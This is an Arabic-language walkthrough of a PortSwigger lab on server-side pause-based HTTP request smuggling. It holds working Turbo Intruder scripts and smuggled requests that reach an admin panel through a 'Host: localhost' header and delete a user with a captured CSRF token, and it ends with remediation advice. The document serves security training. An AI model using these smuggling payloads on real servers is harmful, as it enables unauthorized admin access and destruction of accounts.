# [Server-side pause-based request smuggling](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)

## **`الهدف`**
قم بتهريب طلب إلى سيرفر الواجهة الخلفية، بحيث يصل إلى لوحة التحكم `/admin` ويحذف حساب `carlos`.
## **`خطوات الحل`**
**`ملاحظات هامة:`** 
1. لا يمكن حل هذ اللاب إلا عن طريق اضافة `Turbo Intruder`
2. في هذا اللاب قمت بالانتقال بين نسختين من سكريبتات `Python` بسبب أن كل طلب كان من الأسهل استعمال سكريبت معين معه، كما أن بعض الخطوات كانت تفشل عند استعمال سكريبت معين وتنجح عند استعمال الأخر.

إذا جربنا إرسال طلب إلى `GET /resources`
```http
GET /resources HTTP/2
Host: 0a82000f037704348012fd1e00d30085.web-security-academy.net
Cookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B
```

سنجد أن الاستجابة تقوم بعمل إعادة توجيه إلى `/resources/`
```http
HTTP/2 302 Found
Location: /resources/
X-Frame-Options: SAMEORIGIN
Server: Apache/2.4.52
Keep-Alive: timeout=120
Content-Length: 0
```

لذلك سنقوم بالتالي:
1. تغيير نوع البروتوكول إلى `HTTP/1.1` من داخل `Inspector panel`.
2. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`. 

ليصبح شكل الطلب فى النهاية كالتالي:
```http
POST /resources HTTP/1.1
Host: 0a82000f037704348012fd1e00d30085.web-security-academy.net
Cookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B
Content-Length: 32

GET /TEST HTTP/1.1
TEST1: TEST2
```

وسنقوم بتحويل الطلب إلى `Turbo Intruder`  وسنستعمل سكريبت `Python` التالي
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )

    engine.queue(target.req, pauseBefore=-32, pauseTime=61000)

    # الطلب اللي هيتبعت بعد التوقف المؤقت
    followUp = 'GET / HTTP/1.1\r\nHost: 0a82000f037704348012fd1e00d30085.web-security-academy.net\r\nCookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B\r\n\r\n'
    engine.queue(followUp)
  
def handleResponse(req, interesting):
    table.add(req)
```
ويمكن استخدام معامل `pauseMarker` كبديل لمعامل `pauseBefore` 
```Python
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
```

وسنجد أن استجابة الطلب الثاني العادي هي `404 Not Found` وهذ يعني أننا نجحنا في تهرب البادئة الخبيثة في الطلب الرئيسي
```http
HTTP/1.1 302 Found
Location: /TEST/
X-Frame-Options: SAMEORIGIN
Server: Apache/2.4.52
Keep-Alive: timeout=120
Content-Length: 0
```

بعد ذلك سنقوم بتحويل هذا الطلب إلى `Turbo Intruder` والذي يحتوي على طلب مُهرب لـ `/admin`
```http
POST /resources HTTP/1.1
Host: 0a82000f037704348012fd1e00d30085.web-security-academy.net
Cookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B
Content-Length: 34

GET /admin/ HTTP/1.1
TEST1: TEST2
```
 
 وسنستعمل سكريبت `Python` التالي، وهو مختلف قليلًا عن السكريبت السابق، حيث أن هذا السكريبت يقوم بإرسال نفس الطلب في المرة الثانية بعد إرسال الطلب الأول الذي يحتوي على طلب مُهرب
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    engine.queue(target.req, pauseBefore=-34, pauseTime=61000)
    engine.queue(target.req)


def handleResponse(req, interesting):
    table.add(req)
```

وسنجد أن هناك عبارة مثيرة للانتباه وهي :
`Admin interface only available to local users`

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Server: Apache/2.4.52
Keep-Alive: timeout=120
Content-Length: 2704

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Server-side pause-based request smuggling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Server-side pause-based request smuggling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    Admin interface only available to local users
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

لذلك سنقوم بإعادة إستعمال نفس الطلب ولكن سنستعمل السكريبت الأول وكذلك سنضيف ترويسة `Host: localhost`
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )

    engine.queue(target.req, pauseBefore=-34, pauseTime=61000)

    # الطلب اللي هيتبعت بعد التوقف المؤقت
    followUp = 'GET / HTTP/1.1\r\nHost: localhost\r\nCookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B\r\n\r\n'
    engine.queue(followUp)
  
def handleResponse(req, interesting):
    table.add(req)
```

وسنجد أن استجابة الطلب الثاني العادي هي من داخل `/admin`
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Server: Apache/2.4.52
Keep-Alive: timeout=120
Content-Length: 3149

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Server-side pause-based request smuggling</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Server-side pause-based request smuggling</h2>
                            <a class=link-back href='https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="Ok9pVMGLlRxCVDv6GztKLzvbUPEOkVrP">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
                    </form>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

وبفحص هذه الاستجابة سنجد أننا نحتاج إلى إضافة `csrf=Ok9pVMGLlRxCVDv6GztKLzvbUPEOkVrP&username=carlos` في جسم الطلب المُهرب وكذلك جعل الطلب `POST admin/delete` وبالطبع سنحتاج إلى إضافة ترويسة `Content-Length` ثانية في الطلب المُهرب

لذلك سنقوم بالتعديلات المطلوبة ليصبح كالتالي:
```http
POST /resources HTTP/1.1
Host: 0a82000f037704348012fd1e00d30085.web-security-academy.net
Cookie: session=bG3qQv8qRRfldyZdG8LouhSGPKFImB9B
Content-Length: 122

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Length: 53

csrf=Ok9pVMGLlRxCVDv6GztKLzvbUPEOkVrP&username=carlos
```

وسنقوم بتحويل الطلب إلى `Turbo Intruder`  وسنستعمل سكريبت `Python` التالي
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )
    engine.queue(target.req, pauseBefore=-122, pauseTime=61000)
    engine.queue(target.req)


def handleResponse(req, interesting):
    table.add(req)
```
وبعد ذلك عند تلقى الاستجابة سنجد أنه تم حذف حساب `carlos` لننتهي من حل اللاب
## **`ترقيع الثغرة`**
يجب استخدام `HTTP/2 (End-to-End)` حيث أنه لا يعتمد على الترويسات النصية لتحديد طول الطلب، بل يعتمد على تقسيم البيانات إلى إطارات ثنائية `Binary Frames` مدمج بها طول كل إطار بشكل صريح.

ويجب ضبط سيرفر الواجهة الأمامية لكي لا يُرسل أى طلب إلى الواجهة الخلفية إلا بعد استلام كامل الطلب بما يتطابق مع الـ `Content-Length`.

ويجب جعل مهلة الـ `Read Timeout` في الواجهة الأمامية أقصر من أو تساوى مهلة الاتصال في الواجهة الخلفية.

وهناك حل غير غير مفضل برمجياً لأنه يستهلك موارد السيرفر ويقلل من سرعة الاستجابة، وهو تعطيل إعادة استخدام الاتصال عن طريق إعداد سيرفر الواجهة الخلفية لينهي اتصال الـ `TCP` فوراً بعد معالجة كل طلب عبر استخدام ترويسة `Connection: close`.

ويُنصح باستخدام نفس نوع وإصدار السيرفر للواجهتين الأمامية والخلفية إذا أمكن، وكذلك الالتزام بتحديث السيرفرات أولًا بأول لزيادة الأمان وتفادي جميع الثغرات فور ظهورها.
